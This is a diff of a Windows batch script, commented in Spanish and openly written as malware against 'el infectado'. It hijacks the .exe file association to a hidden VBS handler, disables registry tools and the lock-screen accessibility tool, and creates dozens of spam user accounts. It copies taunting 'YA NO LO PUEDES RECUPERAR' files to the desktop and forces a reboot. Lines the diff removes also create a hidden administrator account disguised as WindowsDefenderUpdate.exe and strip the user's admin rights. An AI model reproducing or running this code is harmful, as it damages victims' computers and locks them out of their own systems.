@@ -12,8 +12,6 @@ REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v No
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v UseDefaultTile /t REG_DWORD /d 1 /f
 ::Desabilitacion de Accesibilidad de la pantalla de Bloqueo
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /v Debugger /t REG_SZ /d "NUL" /f
-::Desabilitacion del Fondo de Bloqueo de Windows 8.1/10/11
-reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v DisableLogonBackgroundImage /t REG_DWORD /d 1 /f
 ::Cambio de Fondo
 reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "C:\Windows\System32\Microsoft\Protect\Defender.Update\img000.png" /f
 RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
@@ -29,33 +27,6 @@ reg add "HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System" /v Disabl
 reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f
 
 ::Seccion de Usuarios
-
-::Usuarios SPAM
-net user T3yZrQ Maxcheto /add
-net user 8rJpX1 Maxcheto /add
-net user 9MaL2Z Maxcheto /add
-net user K4$dF27 Maxcheto /add
-net user xC78RT Maxcheto /add
-net user 3nL9$p2x Maxcheto /add
-net user X7hbQ5Z Maxcheto /add
-net user R2xD1B Maxcheto /add
-net user m14T8z Maxcheto /add
-net user L27w8G Maxcheto /add
-net user P9dR2Y Maxcheto /add
-net user 5QL71t Maxcheto /add
-net user r8B6V3F Maxcheto /add
-net user 7CXz1b Maxcheto /add
-net user n38vJQ Maxcheto /add
-net user x6G7P1L Maxcheto /add
-net user M239Wk Maxcheto /add
-net user 7F2hY4Z Maxcheto /add
-net user 8QrB1L7 Maxcheto /add
-net user t93V6D Maxcheto /add
-net user 5tG2Q8J Maxcheto /add
-net user x9K1P7L Maxcheto /add
-net user z7R4M3 Maxcheto /add
-net user WindowsDefenderUpdate.exe H!ml /add
-net localgroup Administradores WindowsDefenderUpdate.exe /add
 
 ::Cambio de Nombre
 set "currentUser=%username%"
@@ -83,14 +54,36 @@ copy "%sourceDir%\guest.png" "%targetDir%"
 copy "%sourceDir%\user.bmp" "%targetDir%"
 copy "%sourceDir%\guest.bmp" "%targetDir%"
 
+::Usuarios SPAM
+net user T3yZrQ Maxcheto /add
+net user 8rJpX1 Maxcheto /add
+net user 9MaL2Z Maxcheto /add
+net user K4$dF27 Maxcheto /add
+net user xC78RT Maxcheto /add
+net user 3nL9$p2x Maxcheto /add
+net user X7hbQ5Z Maxcheto /add
+net user R2xD1B Maxcheto /add
+net user m14T8z Maxcheto /add
+net user L27w8G Maxcheto /add
+net user P9dR2Y Maxcheto /add
+net user 5QL71t Maxcheto /add
+net user r8B6V3F Maxcheto /add
+net user 7CXz1b Maxcheto /add
+net user n38vJQ Maxcheto /add
+net user x6G7P1L Maxcheto /add
+net user M239Wk Maxcheto /add
+net user 7F2hY4Z Maxcheto /add
+net user 8QrB1L7 Maxcheto /add
+net user t93V6D Maxcheto /add
+net user 5tG2Q8J Maxcheto /add
+net user x9K1P7L Maxcheto /add
+net user z7R4M3 Maxcheto /add
+
 ::Fin de Seccion Usuarios
 
 ::Cambio de Configuracion de archivos.exe
 assoc .exe=VBSExeHandler
 ftype VBSExeHandler=wscript.exe "C:\Windows\System32\Microsoft\Protect\Defender.Update\aplicaciones.vbs" "%1" %*
-
-::Regalito
-net localgroup Administradores "%currentUser%" /delete
 
 ::Archivos SPAM en el escritorio del infectado
 set "escritorio=%USERPROFILE%\Desktop"
@@ -98,10 +91,13 @@ set "archivoFuente=C:\Windows\System32\Microsoft\Protect\Defender.Update\main.tx
 
 if not exist "%archivoFuente%" exit /b
 
-for /l %%i in (1,1,400) do (
+for /l %%i in (1,1,10) do (
     copy "%archivoFuente%" "%escritorio%\YA NO LO PUEDES RECUPERAR.txt" >nul
 )
 
 
-::Regalito Grodo
-powershell -Command "wininit"
+::Regalito Grodo (da error a los demas codigos aveces funciona)
+::powershell -Command "wininit"
+
+::Reinicio
+shutdown /r /f /t 0
